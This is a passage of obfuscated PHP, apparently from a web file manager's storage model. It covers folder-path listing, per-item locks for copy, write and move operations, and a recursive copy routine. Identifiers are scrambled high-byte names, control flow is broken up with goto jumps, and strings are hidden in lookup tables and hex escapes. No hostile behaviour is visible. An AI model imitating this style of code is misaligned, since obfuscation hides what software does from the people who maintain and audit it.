$AÉŒë«ß“‘) { goto DóÅòƒí¸æ; DóÅòƒí¸æ: $A‚ÒÀÔÏ†Ñ =& $_SERVER[ã®Â„Éæ¹¤]; if (intval($f¼Ô±¦—ã‰[$A‚ÒÀÔÏ†Ñ[371]]) !== self::TYPE_SYSTEM) { return; } if (!in_array($AÉŒë«ß“‘, $E‹ğ”°·Ã¹) && $f¼Ô±¦—ã‰[$A‚ÒÀÔÏ†Ñ[369]] != $AÉŒë«ß“‘) { return; } goto E…ªŠ„š¸Ã; E’õ§«¯˜î: $f¼Ô±¦—ã‰[$A‚ÒÀÔÏ†Ñ[461]] = $A‚ÒÀÔÏ†Ñ[472] . implode($A‚ÒÀÔÏ†Ñ[47], array_slice($E‹ğ”°·Ã¹, 1)) . $A‚ÒÀÔÏ†Ñ[47]; if ($f¼Ô±¦—ã‰[$A‚ÒÀÔÏ†Ñ[369]] == $AÉŒë«ß“‘) { $f¼Ô±¦—ã‰[$A‚ÒÀÔÏ†Ñ[461]] = $A‚ÒÀÔÏ†Ñ[472]; $f¼Ô±¦—ã‰[$A‚ÒÀÔÏ†Ñ[463]] = $A‚ÒÀÔÏ†Ñ[470]; $f¼Ô±¦—ã‰[$A‚ÒÀÔÏ†Ñ[28]] = LNG($A‚ÒÀÔÏ†Ñ[471]); } $f¼Ô±¦—ã‰[$A‚ÒÀÔÏ†Ñ[473]] = $A‚ÒÀÔÏ†Ñ[474]; goto e­¢ÒÉ‹ÖŠ; E…ªŠ„š¸Ã: $FÙñğ¨‚°é = explode($A‚ÒÀÔÏ†Ñ[8], trim($f¼Ô±¦—ã‰[$A‚ÒÀÔÏ†Ñ[468]], $A‚ÒÀÔÏ†Ñ[8])); $bé·³Â = implode($A‚ÒÀÔÏ†Ñ[8], array_slice($FÙñğ¨‚°é, 2)); $f¼Ô±¦—ã‰[$A‚ÒÀÔÏ†Ñ[468]] = $A‚ÒÀÔÏ†Ñ[8] . LNG($A‚ÒÀÔÏ†Ñ[471]) . $A‚ÒÀÔÏ†Ñ[8] . ltrim($bé·³Â, $A‚ÒÀÔÏ†Ñ[8]); goto E’õ§«¯˜î; e­¢ÒÉ‹ÖŠ: } protected function _listAppendPathRoot(&$CâŸÄ¦†’§, $dÚ¼Ò‚ßÙÎ) { $DÉ‹²È™¾ä =& $_SERVER[ã®Â„Éæ¹¤]; $aö§èˆÂâ = $DÉ‹²È™¾ä[33]; if ($CâŸÄ¦†’§[$DÉ‹²È™¾ä[371]] == self::TYPE_USER) { if (defined($DÉ‹²È™¾ä[427]) && $CâŸÄ¦†’§[$DÉ‹²È™¾ä[458]] == USER_ID) { $aö§èˆÂâ = LNG($DÉ‹²È™¾ä[475]); if (!$dÚ¼Ò‚ßÙÎ) { $CâŸÄ¦†’§[$DÉ‹²È™¾ä[28]] = $aö§èˆÂâ; } } else { $fä“˜—©Ù· = Model($DÉ‹²È™¾ä[476])->getInfoSimple($CâŸÄ¦†’§[$DÉ‹²È™¾ä[458]]); $aö§èˆÂâ = LNG($DÉ‹²È™¾ä[477]) . $DÉ‹²È™¾ä[157] . $fä“˜—©Ù·[$DÉ‹²È™¾ä[28]] . $DÉ‹²È™¾ä[478]; } } else { if ($CâŸÄ¦†’§[$DÉ‹²È™¾ä[371]] == self::TYPE_GROUP) { $fä“˜—©Ù· = Model($DÉ‹²È™¾ä[460])->getInfoSimple($CâŸÄ¦†’§[$DÉ‹²È™¾ä[458]]); $aö§èˆÂâ = $fä“˜—©Ù·[$DÉ‹²È™¾ä[28]]; } else { if ($CâŸÄ¦†’§[$DÉ‹²È™¾ä[371]] == self::TYPE_SYSTEM) { $fä“˜—©Ù· = $this->sourceInfo($dÚ¼Ò‚ßÙÎ[0], !0); $aö§èˆÂâ = $fä“˜—©Ù·[$DÉ‹²È™¾ä[28]]; } } } $aö§èˆÂâ = $aö§èˆÂâ ? $DÉ‹²È™¾ä[8] . $aö§èˆÂâ . $DÉ‹²È™¾ä[8] : $DÉ‹²È™¾ä[8]; return $aö§èˆÂâ; } protected function _listAppendUser(&$d¯†ƒ¾ƒ¾Ò) { goto Dì•Ö–çˆ†; Dì•Ö–çˆ†: $Eí‰½³ìÃÔ =& $_SERVER[ã®Â„Éæ¹¤]; $DÔ¿­°¥‡¯ = array_to_keyvalue($d¯†ƒ¾ƒ¾Ò, $Eí‰½³ìÃÔ[33], $Eí‰½³ìÃÔ[378]); $Då¬ÅÜŸ  = array_to_keyvalue($d¯†ƒ¾ƒ¾Ò, $Eí‰½³ìÃÔ[33], $Eí‰½³ìÃÔ[379]); goto fƒø¿ì†±¿; fƒø¿ì†±¿: $f—•´•‡´š = array_merge($DÔ¿­°¥‡¯, $Då¬ÅÜŸ ); $eç›‰ì¤Ğº = Model($Eí‰½³ìÃÔ[479])->userListInfo($f—•´•‡´š); foreach ($d¯†ƒ¾ƒ¾Ò as &$C¢ÑÙ¥»¶) { $DÌÉùßĞ¾ = $C¢ÑÙ¥»¶[$Eí‰½³ìÃÔ[378]]; $C¢ÑÙ¥»¶[$Eí‰½³ìÃÔ[378]] = $eç›‰ì¤Ğº[$DÌÉùßĞ¾] ? $eç›‰ì¤Ğº[$DÌÉùßĞ¾] : !1; $DÌÉùßĞ¾ = $C¢ÑÙ¥»¶[$Eí‰½³ìÃÔ[379]]; $C¢ÑÙ¥»¶[$Eí‰½³ìÃÔ[379]] = $eç›‰ì¤Ğº[$DÌÉùßĞ¾] ? $eç›‰ì¤Ğº[$DÌÉùßĞ¾] : !1; if (isset($C¢ÑÙ¥»¶[$Eí‰½³ìÃÔ[417]]) && $C¢ÑÙ¥»¶[$Eí‰½³ìÃÔ[417]][$Eí‰½³ìÃÔ[480]]) { $eºàô•ö‰‰ = $GLOBALS[$Eí‰½³ìÃÔ[6]][$Eí‰½³ìÃÔ[84]][$Eí‰½³ìÃÔ[481]]; if ($C¢ÑÙ¥»¶[$Eí‰½³ìÃÔ[417]][$Eí‰½³ìÃÔ[482]] <= time() - $eºàô•ö‰‰) { $this->metaSet($C¢ÑÙ¥»¶[$Eí‰½³ìÃÔ[369]], $Eí‰½³ìÃÔ[480], null); $this->metaSet($C¢ÑÙ¥»¶[$Eí‰½³ìÃÔ[369]], $Eí‰½³ìÃÔ[482], null); unset($C¢ÑÙ¥»¶[$Eí‰½³ìÃÔ[417]][$Eí‰½³ìÃÔ[480]]); continue; } $bõÙéƒñ¦Œ = $C¢ÑÙ¥»¶[$Eí‰½³ìÃÔ[417]][$Eí‰½³ìÃÔ[480]]; $C¢ÑÙ¥»¶[$Eí‰½³ìÃÔ[417]][$Eí‰½³ìÃÔ[483]] = Model($Eí‰½³ìÃÔ[479])->getInfoSimpleOuter($bõÙéƒñ¦Œ); } } goto E‚ÀÚÊ×Õ; E‚ÀÚÊ×Õ: unset($C¢ÑÙ¥»¶); goto B„†¡—ÎÚŸ; B„†¡—ÎÚŸ: } public function parentLevelArray($f °ƒº‡Øˆ) { $Bˆ¯±‘¥‚Í =& $_SERVER[ã®Â„Éæ¹¤]; $f °ƒº‡Øˆ = explode($Bˆ¯±‘¥‚Í[47], trim($f °ƒº‡Øˆ, $Bˆ¯±‘¥‚Í[47])); return array_remove_value($f °ƒº‡Øˆ, $Bˆ¯±‘¥‚Í[470]); } public function listAll($dÚè“®¤Ø¶) { goto e›Ü‚ÃñÅÌ; F§ãÊÃ®¥: $this->_listAppendAuth($a¥×ÙÑóÀ’); $this->_listAppendUser($a¥×ÙÑóÀ’); $this->_listAppendPath($a¥×ÙÑóÀ’); goto d˜ƒ§Šƒ±õ; e›Ü‚ÃñÅÌ: $F¦Î¦Œé”é =& $_SERVER[ã®Â„Éæ¹¤]; $d²Ö»¡¥‹ = $this->sourceInfo($dÚè“®¤Ø¶); $D‡é¢æÎ• = array($F¦Î¦Œé”é[484] => array($F¦Î¦Œé”é[485], $d²Ö»¡¥‹[$F¦Î¦Œé”é[461]] . $dÚè“®¤Ø¶ . $F¦Î¦Œé”é[486]), $F¦Î¦Œé”é[487] => 0); goto dîø›ÊŒ¼°; dîø›ÊŒ¼°: $a†æ‹„º¥™ = $F¦Î¦Œé”é[488]; $C‡ø¸Ì·Àæ = "\x4c\x45\x46\x54\x20\x4a\117\111\x4e\x20{$this->tablePrefix}\151\x6f\x5f\x66\x69\x6c\145\40\x66\151\154\x65\x20\157\156\x20\x73\x6f\x75\x72\x63\x65\x2e\146\x69\x6c\145\111\x44\x20\75\x20\146\x69\154\145\x2e\x66\x69\x6c\145\111\x44"; $a¥×ÙÑóÀ’ = $this->alias($F¦Î¦Œé”é[489])->field($a†æ‹„º¥™)->where($D‡é¢æÎ•)->join($C‡ø¸Ì·Àæ)->select(); goto F§ãÊÃ®¥; aïµ¤è„æˆ: $f´âã´´ = array(); foreach ($a¥×ÙÑóÀ’ as $FŸìåÜáæÆ => $eì„°Šíº) { goto CîêŞ—…î¤; CîêŞ—…î¤: $F¸ØÉ´²Î = $this->parentLevelArray($eì„°Šíº[$F¦Î¦Œé”é[461]]); array_shift($F¸ØÉ´²Î); $FàÖâœ›Á = $Cœˆª¼“åÌ; goto b²ÙÁŒÒ²; bàÚñ’­‡: $FàÖâœ›Á = str_replace($F¦Î¦Œé”é[469], $F¦Î¦Œé”é[8], $FàÖâœ›Á); $FàÖâœ›Á = str_replace($F¦Î¦Œé”é[469], $F¦Î¦Œé”é[8], $FàÖâœ›Á); $cßâ§¢ùßƒ = array($F¦Î¦Œé”é[387] => str_replace($F¦Î¦Œé”é[469], $F¦Î¦Œé”é[8], $FàÖâœ›Á), $F¦Î¦Œé”é[490] => intval($eì„°Šíº[$F¦Î¦Œé”é[370]]), $F¦Î¦Œé”é[391] => $this->pathInfoFilter($eì„°Šíº, !0)); goto f„äã°ïÂ; f„äã°ïÂ: if (!$eì„°Šíº[$F¦Î¦Œé”é[370]]) { $cßâ§¢ùßƒ[$F¦Î¦Œé”é[419]] = $eì„°Šíº[$F¦Î¦Œé”é[419]]; $cßâ§¢ùßƒ[$F¦Î¦Œé”é[491]] = $eì„°Šíº[$F¦Î¦Œé”é[75]]; } $f´âã´´[] = $cßâ§¢ùßƒ; goto d²†õ áî•; b²ÙÁŒÒ²: for ($f©®İŞæğé = 0; $f©®İŞæğé < count($F¸ØÉ´²Î); $f©®İŞæğé++) { $FàÖâœ›Á .= $a¥×ÙÑóÀ’[$F¸ØÉ´²Î[$f©®İŞæğé]][$F¦Î¦Œé”é[28]] . $F¦Î¦Œé”é[8]; } $FàÖâœ›Á .= $eì„°Šíº[$F¦Î¦Œé”é[28]]; if ($eì„°Šíº[$F¦Î¦Œé”é[370]]) { $FàÖâœ›Á .= $F¦Î¦Œé”é[8]; } goto bàÚñ’­‡; d²†õ áî•: } return $f´âã´´; goto a‡«£©º›; d˜ƒ§Šƒ±õ: $a¥×ÙÑóÀ’ = array_to_keyvalue($a¥×ÙÑóÀ’, $F¦Î¦Œé”é[369]); $Cœˆª¼“åÌ = "\x2f{$d²Ö»¡¥‹[$F¦Î¦Œé”é[28]]}\57"; $Cœˆª¼“åÌ = $Cœˆª¼“åÌ == $F¦Î¦Œé”é[469] ? $F¦Î¦Œé”é[8] : $Cœˆª¼“åÌ; goto aïµ¤è„æˆ; a‡«£©º›: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($C©î”¥­) { goto e©ÕŸÍ•Ûï; DºÒÍÈ£—: $D§«¢œ¸ = 1; $this->_lockEvent($C©î”¥­, array($B×ê§Ó¾Éò[493], $B×ê§Ó¾Éò[494]), $D§«¢œ¸); $this->_lockParent($C©î”¥­, array($B×ê§Ó¾Éò[494]), $D§«¢œ¸); goto føáƒ‹Õ; føáƒ‹Õ: $this->_lockEvent($C©î”¥­, array($B×ê§Ó¾Éò[495], $B×ê§Ó¾Éò[496]), $D§«¢œ¸); $this->_lockCheckEnd($B×ê§Ó¾Éò[492], $C©î”¥­); goto B—ÀÑİÅİ; e©ÕŸÍ•Ûï: $B×ê§Ó¾Éò =& $_SERVER[ã®Â„Éæ¹¤]; if (!$this->allowLock()) { return; } $this->_lockCheck($B×ê§Ó¾Éò[492], $C©î”¥­); goto DºÒÍÈ£—; B—ÀÑİÅİ: } public function lockCopyEnd($E‰‰¶›Œ¥ê) { $CÚ”ëï°ÇÃ =& $_SERVER[ã®Â„Éæ¹¤]; if (!$this->allowLock()) { return; } $bºğçŠœß = 0; $this->_lockEvent($E‰‰¶›Œ¥ê, array($CÚ”ëï°ÇÃ[493], $CÚ”ëï°ÇÃ[494]), $bºğçŠœß); $this->_lockParent($E‰‰¶›Œ¥ê, array($CÚ”ëï°ÇÃ[494]), $bºğçŠœß); $this->_lockEvent($E‰‰¶›Œ¥ê, array($CÚ”ëï°ÇÃ[495], $CÚ”ëï°ÇÃ[496]), $bºğçŠœß); } public function lockWriteStart($Dªóƒ…–İÈ, $B°ê‰‰Ü‹¶ = '') { goto a…ÈŸÆáğ; aã äÍÏ‘‡: $FÎÑàÂÏõ = 1; $this->_lockKey($dù‘»–‹¡¿[497] . $Dªóƒ…–İÈ . $dù‘»–‹¡¿[91] . $B°ê‰‰Ü‹¶, $FÎÑàÂÏõ); $this->_lockEvent($Dªóƒ…–İÈ, array($dù‘»–‹¡¿[492], $dù‘»–‹¡¿[494]), $FÎÑàÂÏõ); goto A¶÷’ìéœÜ; a…ÈŸÆáğ: $dù‘»–‹¡¿ =& $_SERVER[ã®Â„Éæ¹¤]; if (!$this->allowLock()) { return; } $this->_lockCheck($dù‘»–‹¡¿[493], $Dªóƒ…–İÈ); goto aã äÍÏ‘‡; A¶÷’ìéœÜ: $this->_lockParent($Dªóƒ…–İÈ, array($dù‘»–‹¡¿[492], $dù‘»–‹¡¿[494]), $FÎÑàÂÏõ); $this->_lockCheckEnd($dù‘»–‹¡¿[493], $Dªóƒ…–İÈ); goto B­–æÚ¶ÈÇ; B­–æÚ¶ÈÇ: } public function lockWriteEnd($Bé›°ˆİ¾¿, $d¨Áò‡¼¸… = '') { $DœéŠ‘îÑ =& $_SERVER[ã®Â„Éæ¹¤]; if (!$this->allowLock()) { return; } $a‡øÉÃ‘ÊŒ = 0; $this->_lockKey($DœéŠ‘îÑ[497] . $Bé›°ˆİ¾¿ . $DœéŠ‘îÑ[91] . $d¨Áò‡¼¸…, $a‡øÉÃ‘ÊŒ); $this->_lockEvent($Bé›°ˆİ¾¿, array($DœéŠ‘îÑ[492], $DœéŠ‘îÑ[494]), $a‡øÉÃ‘ÊŒ); $this->_lockParent($Bé›°ˆİ¾¿, array($DœéŠ‘îÑ[492], $DœéŠ‘îÑ[494]), $a‡øÉÃ‘ÊŒ); } public function lockMoveStart($AåÜŠ¦¬¦™) { goto dÂæŸçÆß; dÂæŸçÆß: $Dá¾…ø¾é =& $_SERVER[ã®Â„Éæ¹¤]; if (!$this->allowLock()) { return; } $this->_lockCheck($Dá¾…ø¾é[494], $AåÜŠ¦¬¦™); goto Cºê›ÇØ»ù; Cºê›ÇØ»ù: $BÖ›ßã÷ó = 1; $this->_lockKey($Dá¾…ø¾é[498] . $AåÜŠ¦¬¦™, $BÖ›ßã÷ó); $this->_lockEvent($AåÜŠ¦¬¦™, array($Dá¾…ø¾é[492], $Dá¾…ø¾é[493]), $BÖ›ßã÷ó); goto cÔÒ’Ñë¾Ÿ; cÔÒ’Ñë¾Ÿ: $this->_lockParent($AåÜŠ¦¬¦™, array($Dá¾…ø¾é[492], $Dá¾…ø¾é[494]), $BÖ›ßã÷ó); $this->_lockEvent($AåÜŠ¦¬¦™, array($Dá¾…ø¾é[499], $Dá¾…ø¾é[495], $Dá¾…ø¾é[496]), $BÖ›ßã÷ó); $this->_lockCheckEnd($Dá¾…ø¾é[494], $AåÜŠ¦¬¦™); goto e³Ñ°ØÔÖÑ; e³Ñ°ØÔÖÑ: } public function lockMoveEnd($E…Ùë¡îåò) { goto B•™Äğ¨ğæ; DÔâ•£†´Ò: $this->_lockEvent($E…Ùë¡îåò, array($A†¨˜İ“¤µ[499], $A†¨˜İ“¤µ[495], $A†¨˜İ“¤µ[496]), $aï­‰‹ö«); goto AÃİóùÎ‚; eÔÛÄ¹¨²: $this->_lockKey($A†¨˜İ“¤µ[498] . $E…Ùë¡îåò, $aï­‰‹ö«); $this->_lockEvent($E…Ùë¡îåò, array($A†¨˜İ“¤µ[492], $A†¨˜İ“¤µ[493]), $aï­‰‹ö«); $this->_lockParent($E…Ùë¡îåò, array($A†¨˜İ“¤µ[492], $A†¨˜İ“¤µ[494]), $aï­‰‹ö«); goto DÔâ•£†´Ò; B•™Äğ¨ğæ: $A†¨˜İ“¤µ =& $_SERVER[ã®Â„Éæ¹¤]; if (!$this->allowLock()) { return; } $aï­‰‹ö« = 0; goto eÔÛÄ¹¨²; AÃİóùÎ‚: } private function _lockCheck($Fìî÷ÛŠ¯Ğ, $dˆ¼ìùïìÃ) { goto a­¿Í×Şâ; AÁÑ•·¹ç†: $DëÛÖ¹¸¹© = array_reverse($this->parentLevelArray($fš­äõ’Œè[$c‚‹æĞŠëÀ[461]])); foreach ($DëÛÖ¹¸¹© as $BÃÙÀ§Ï) { $C‡÷–£†…¥ = $Fìî÷ÛŠ¯Ğ . $c‚‹æĞŠëÀ[501] . $BÃÙÀ§Ï; if (CacheLock::lockGet($c‚‹æĞŠëÀ[502] . $C‡÷–£†…¥)) { $fš­äõ’Œè = $this->sourceInfo($BÃÙÀ§Ï); CacheLock::setErrorMsg($c‚‹æĞŠëÀ[157] . htmlspecialchars($fš­äõ’Œè[$c‚‹æĞŠëÀ[28]]) . $c‚‹æĞŠëÀ[478] . $e¼ãğË¼ä); $this->_lockKey($C‡÷–£†…¥, 1); $this->_lockKey($C‡÷–£†…¥, 0); } } goto a¶–”¤¢éâ; a­¿Í×Şâ: $c‚‹æĞŠëÀ =& $_SERVER[ã®Â„Éæ¹¤]; $fš­äõ’Œè = $this->sourceInfo($dˆ¼ìùïìÃ); $C‡÷–£†…¥ = $Fìî÷ÛŠ¯Ğ . $c‚‹æĞŠëÀ[91] . $dˆ¼ìùïìÃ; goto d×„ˆ›£‡í; E—ï‰‘¡î: CacheLock::setErrorMsg($c‚‹æĞŠëÀ[157] . htmlspecialchars($fš­äõ’Œè[$c‚‹æĞŠëÀ[28]]) . $c‚‹æĞŠëÀ[478] . $e¼ãğË¼ä); $this->_lockKey($C‡÷–£†…¥, 1); $this->_lockKey($C‡÷–£†…¥, 0); goto AÁÑ•·¹ç†; d×„ˆ›£‡í: $this->_lockTimeStart[$C‡÷–£†…¥] = timeFloat(); if (!is_array($fš­äõ’Œè)) { return; } $e¼ãğË¼ä = LNG($c‚‹æĞŠëÀ[500]); goto E—ï‰‘¡î; a¶–”¤¢éâ: } private function _lockCheckEnd($EÁ™ £ğáº, $b¡ŠøÙÑ†Ó) { goto bÉª¥«Å¼…; b™“Øô©¶œ: if (!isset($this->_lockTimeStart[$d„½â¨šÏÔ])) { return; } $E„”ØÃÁ” = timeFloat() - $this->_lockTimeStart[$d„½â¨šÏÔ]; unset($this->_lockTimeStart[$d„½â¨šÏÔ]); goto CŸìäàí©; bÉª¥«Å¼…: $C•ŸóôÅŠ¡ =& $_SERVER[ã®Â„Éæ¹¤]; $d„½â¨šÏÔ = $EÁ™ £ğáº . $C•ŸóôÅŠ¡[91] . $b¡ŠøÙÑ†Ó; CacheLock::setErrorMsg($C•ŸóôÅŠ¡[361]); goto b™“Øô©¶œ; CŸìäàí©: if ($E„”ØÃÁ” > 0.5) { unset(self::$cacheSourceInfo[$C•ŸóôÅŠ¡[410] . $b¡ŠøÙÑ†Ó]); } $B¦ÔÑŒ”šĞ = $this->sourceInfo($b¡ŠøÙÑ†Ó); if (!$B¦ÔÑŒ”šĞ) { show_json(LNG($C•ŸóôÅŠ¡[101]), !1); } goto EÉå‡öšøÔ; EÉå‡öšøÔ: } private function _lockParent($BªÚ¾è›·ò, $e§ÅÙµ§öí, $d³å¹Ï÷ƒ) { if (!$this->autoLockSet) { return; } $fğŠå¢ŠÏ = $this->sourceInfo($BªÚ¾è›·ò); if (!is_array($fğŠå¢ŠÏ)) { return; } $dô‚ô‘âÑ‚ = array_reverse($this->parentLevelArray($fğŠå¢ŠÏ[$_SERVER[ã®Â„Éæ¹¤][461]])); foreach ($dô‚ô‘âÑ‚ as $Fì¼Ì×Ü¤º) { $this->_lockEvent($Fì¼Ì×Ü¤º, $e§ÅÙµ§öí, $d³å¹Ï÷ƒ); } } private function _lockEvent($AôöÕÁËØ, $cÍõë‡ª¿, $fÛ¾À…œ–) { $F¾ñÇéƒøÅ =& $_SERVER[ã®Â„Éæ¹¤]; if (!$this->autoLockSet) { return; } foreach ($cÍõë‡ª¿ as $aÛÆ¼Ù—½¸) { $eÈ·ôİÙğ­ = $aÛÆ¼Ù—½¸ . $F¾ñÇéƒøÅ[91] . $AôöÕÁËØ; if ($fÛ¾À…œ– && CacheLock::lockGet($F¾ñÇéƒøÅ[502] . $eÈ·ôİÙğ­)) { continue; } $this->_lockKey($eÈ·ôİÙğ­, $fÛ¾À…œ–); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($Dîí§®øã, $d´‰’ÛÊš³ = 1) { $b£ÇŠ—ÏŒ = $_SERVER[ã®Â„Éæ¹¤][502] . md5($Dîí§®øã); if ($d´‰’ÛÊš³) { if (isset(self::$_lockItemArr[$b£ÇŠ—ÏŒ])) { return; } self::$_lockItemArr[$b£ÇŠ—ÏŒ] = 1; CacheLock::lock($b£ÇŠ—ÏŒ, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$b£ÇŠ—ÏŒ])) { return; } unset(self::$_lockItemArr[$b£ÇŠ—ÏŒ]); CacheLock::unlock($b£ÇŠ—ÏŒ); } } public function isParentOf($b»ÍŠãøº, $dŒèæŠ³é’) { goto A™®¸ƒ¸Å; A™®¸ƒ¸Å: $eĞ˜“ùĞ‡ =& $_SERVER[ã®Â„Éæ¹¤]; $CâœŠŸ¨”á = $this->sourceInfo($b»ÍŠãøº); $Fî²à¥‡ = $this->sourceInfo($dŒèæŠ³é’); goto A®ì¬™’É; A®ì¬™’É: $Eá´ƒ˜•‡ = $CâœŠŸ¨”á[$eĞ˜“ùĞ‡[461]] . $CâœŠŸ¨”á[$eĞ˜“ùĞ‡[369]] . $eĞ˜“ùĞ‡[47]; $BŠ²©’® = $Fî²à¥‡[$eĞ˜“ùĞ‡[461]] . $Fî²à¥‡[$eĞ˜“ùĞ‡[369]] . $eĞ˜“ùĞ‡[47]; $dí÷Œ“æ†Ê = strpos($BŠ²©’®, $Eá´ƒ˜•‡) === 0; goto f¬Úğ÷ãè£; f¬Úğ÷ãè£: return $dí÷Œ“æ†Ê; goto cŠÑ­Ïï¢; cŠÑ­Ïï¢: } private $targetIsDelete = 0; public function copy($AŒ¤İÃ¡ç—, $D«ŞÌ„•šÔ, $dŠŠìåŠ¦‡ = REPEAT_REPLACE, $A‰Şµ·Îó¥ = '') { goto A‘ÀÔ–»; B˜ Ü†ó–: $this->targetIsDelete = intval($D†á§„à‰”[$d²±÷Ÿ°ÖĞ[397]]); $EÁÏ Ç²˜¹ = $this->fileNameExistCache($D«ŞÌ„•šÔ, $D†á§„à‰”[$d²±÷Ÿ°ÖĞ[28]]); $D–êé–ê£ª = $this->_copy($AŒ¤İÃ¡ç—, $D«ŞÌ„•šÔ, $dŠŠìåŠ¦‡, $Fì‚Ü‹±İ, !0, $A‰Şµ·Îó¥); goto CÊŠÖ§¶·; cÒìÊÜ¨¿ä: if ($D†á§„à‰”[$d²±÷Ÿ°ÖĞ[370]] == $d²±÷Ÿ°ÖĞ[83] && $EÁÏ Ç²˜¹ == $D–êé–ê£ª) { $this->folderSizeResetChildren($EÁÏ Ç²˜¹); } Model($d²±÷Ÿ°ÖĞ[506])->addAll($Fì‚Ü‹±İ[$d²±÷Ÿ°ÖĞ[504]], array(), !0); if ($EÁÏ Ç²˜¹ != $D–êé–ê£ª || $D†á§„à‰”[$d²±÷Ÿ°ÖĞ[370]] == $d²±÷Ÿ°ÖĞ[83]) { Model($d²±÷Ÿ°ÖĞ[507])->eventCopy($D–êé–ê£ª); } goto eÚã¤Ğ¼½±; A‘ÀÔ–»: $d²±÷Ÿ°ÖĞ =& $_SERVER[ã®Â„Éæ¹¤]; $D†á§„à‰” = $this->sourceInfo($AŒ¤İÃ¡ç—); $cµŞªŒî¿Š = $this->sourceInfo($D«ŞÌ„•šÔ); goto Aâ½åµ¡Ü»; Aâ½åµ¡Ü»: if (!$D†á§„à‰” || !$cµŞªŒî¿Š || $cµŞªŒî¿Š[$d²±÷Ÿ°ÖĞ[370]] != $d²±÷Ÿ°ÖĞ[83]) { return !1; } if ($this->isParentOf($AŒ¤İÃ¡ç—, $D«ŞÌ„•šÔ)) { return !1; } $aƒ‡éøìî = $A‰Şµ·Îó¥ ? $A‰Şµ·Îó¥ : $D†á§„à‰”[$d²±÷Ÿ°ÖĞ[28]]; goto Cì«”´ß‚; CËÚ±¥ö: $this->updateModifyTime($D«ŞÌ„•šÔ); return $D–êé–ê£ª; goto bÈÅ©ª¤Úã; Cì«”´ß‚: $this->lockCopyStart($AŒ¤İÃ¡ç—); $this->lockWriteStart($D«ŞÌ„•šÔ, $aƒ‡éøìî); $Fì‚Ü‹±İ = array($d²±÷Ÿ°ÖĞ[503] => array(), $d²±÷Ÿ°ÖĞ[504] => array(), $d²±÷Ÿ°ÖĞ[505] => array()); goto B˜ Ü†ó–; CÊŠÖ§¶·: $this->_childrenListClear(); $this->lockCopyEnd($AŒ¤İÃ¡ç—); $this->lockWriteEnd($D«ŞÌ„•šÔ, $aƒ‡éøìî); goto cÒìÊÜ¨¿ä; eÚã¤Ğ¼½±: $this->saveAll($Fì‚Ü‹±İ[$d²±÷Ÿ°ÖĞ[505]]); Model($d²±÷Ÿ°ÖĞ[167])->linkAdd($Fì‚Ü‹±İ[$d²±÷Ÿ°ÖĞ[503]]); $this->folderSizeReset($D«ŞÌ„•šÔ); goto CËÚ±¥ö; bÈÅ©ª¤Úã: } private function _copy($b‰³ Èµš†, $FÚ™Åâ”ø®, $b×ÇòàÂ¶Š, &$fîÜ¤ƒä®é, $F¨ƒÆÙ‰¾ƒ, $BÅåğ±—Ö = '') { goto bß·®‰¸ğ; bß·®‰¸ğ: $f“ÆÍÖŠ” =& $_SERVER[ã®Â„Éæ¹¤]; $CŠ½»øÓ³ = $this->sourceInfoCache($b‰³ Èµš†); $e‚Îß‚Îœ = $CŠ½»øÓ³[$f“ÆÍÖŠ”[370]] == $f“ÆÍÖŠ”[83]; goto A«÷Ã‰××©; C¤öíÉç: if (!$cä…¨’Øœè) { return $this->_copyCreate($b‰³ Èµš†, $FÚ™Åâ”ø®, $DÜ¾ÎÙÅ’Ç, $fîÜ¤ƒä®é); } $cÙ˜”á…ÒÊ = $cä…¨’Øœè; if ($e‚Îß‚Îœ) { if ($b×ÇòàÂ¶Š == REPEAT_RENAME_FOLDER) { $DÜ¾ÎÙÅ’Ç = $this->fileNameAutoCache($FÚ™Åâ”ø®, $DÜ¾ÎÙÅ’Ç, $b×ÇòàÂ¶Š, $e‚Îß‚Îœ); $cÙ˜”á…ÒÊ = $this->_copyCreate($b‰³ Èµš†, $FÚ™Åâ”ø®, $DÜ¾ÎÙÅ’Ç, $fîÜ¤ƒä®é); } else { $EÛ”±³Œ·Ï = $this->_childrenList($b‰³ Èµš†); foreach ($EÛ”±³Œ·Ï as $bÎ¨®³¥) { $this->_copy($bÎ¨®³¥[$f“ÆÍÖŠ”[369]], $cä…¨’Øœè, $b×ÇòàÂ¶Š, $fîÜ¤ƒä®é, !1); } } } else { if ($b×ÇòàÂ¶Š == REPEAT_RENAME || $b×ÇòàÂ¶Š == REPEAT_RENAME_FOLDER) { $DÜ¾ÎÙÅ’Ç = $this->fileNameAutoCache($FÚ™Åâ”ø®, $DÜ¾ÎÙÅ’Ç, $b×ÇòàÂ¶Š, $e‚Îß‚Îœ); $cÙ˜”á…ÒÊ = $this->_copyCreate($b‰³ Èµš†, $FÚ™Åâ”ø®, $DÜ¾ÎÙÅ’Ç, $fîÜ¤ƒä®é); } else { if ($b×ÇòàÂ¶Š == REPEAT_REPLACE) { $A®‘èÕêÀØ = $this->sourceInfoCache($cä…¨’Øœè); $c‡È’“Ä¸÷ = $this->fileHistory($A®‘èÕêÀØ, $CŠ½»øÓ³[$f“ÆÍÖŠ”[419]], $CŠ½»øÓ³[$f“ÆÍÖŠ”[77]]); if ($c‡È’“Ä¸÷) { $fîÜ¤ƒä®é[$f“ÆÍÖŠ”[503]][] = $CŠ½»øÓ³[$f“ÆÍÖŠ”[419]]; } } else { if ($b×ÇòàÂ¶Š == REPEAT_SKIP) { } } } Hook::trigger($f“ÆÍÖŠ”[508], array($f“ÆÍÖŠ”[509], $CŠ½»øÓ³, 0)); } goto aÈ˜á„‘Ï…; aÈ˜á„‘Ï…: return $cÙ˜”á…ÒÊ; goto E©‹¿îò×É; A«÷Ã‰××©: $DÜ¾ÎÙÅ’Ç = $BÅåğ±—Ö ? $BÅåğ±—Ö : $CŠ½»øÓ³[$f“ÆÍÖŠ”[28]]; $cä…¨’Øœè = $this->fileNameExistCache($FÚ™Åâ”ø®, $DÜ¾ÎÙÅ’Ç); if ($F¨ƒÆÙ‰¾ƒ) { $this->_childrenAllMake($b‰³ Èµš†); if ($e‚Îß‚Îœ && $cä…¨’Øœè) { $this->_childrenAllMake($cä…¨’Øœè); } } goto C¤öíÉç; E©‹¿îò×É: } private function _copyCreate($cÑÑµñ¿Æ¸, $F½–ìØ¬Ò, $F÷åÄ¡Ã¸Ä, &$C£‹œÖÙ¦ò) { goto BßÖ…¼×„õ; BßÖ…¼×„õ: $A²ğÙ•ª =& 